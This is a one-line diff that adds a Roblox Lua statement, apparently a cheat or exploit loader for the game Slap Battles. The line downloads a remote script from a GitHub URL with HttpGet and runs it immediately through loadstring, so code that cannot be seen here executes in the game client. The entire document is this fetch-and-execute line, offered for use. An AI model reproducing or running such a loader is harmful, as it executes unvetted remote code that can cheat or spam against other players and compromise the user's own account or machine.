@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/update-slap-battles-spam0-0tnfygg1hqvvvd.lua"))()
